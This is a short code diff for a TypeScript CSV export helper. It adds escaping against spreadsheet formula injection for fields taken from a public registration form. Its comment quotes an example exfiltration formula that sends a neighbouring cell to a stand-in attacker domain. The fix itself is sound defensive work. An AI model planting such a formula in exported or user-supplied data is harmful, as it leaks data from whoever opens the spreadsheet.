@@ -155,9 +155,19 @@ export function mapImportRows(table: string[][]): ImportParseResult {
   return { rows, skipped, unmappedHeaders };
 }
 
-/** Quote a value for CSV export. */
+/**
+ * Quote a value for CSV export, and defuse spreadsheet formulas.
+ *
+ * Names, headlines and skills come from the public registration form and end up
+ * in a file a recruiter opens in Excel. A value starting with `=`, `+`, `-` or
+ * `@` is treated as a formula there, so a registrant could put
+ * `=HYPERLINK("https://evil.tld?d="&B2, "CV")` in their headline and have the
+ * recruiter's own spreadsheet leak the neighbouring cell. Prefixing an
+ * apostrophe makes the cell literal text; Excel does not display it.
+ */
 export function csvCell(value: unknown): string {
-  const s = value === null || value === undefined ? "" : String(value);
+  const raw = value === null || value === undefined ? "" : String(value);
+  const s = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
   return /[",;\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
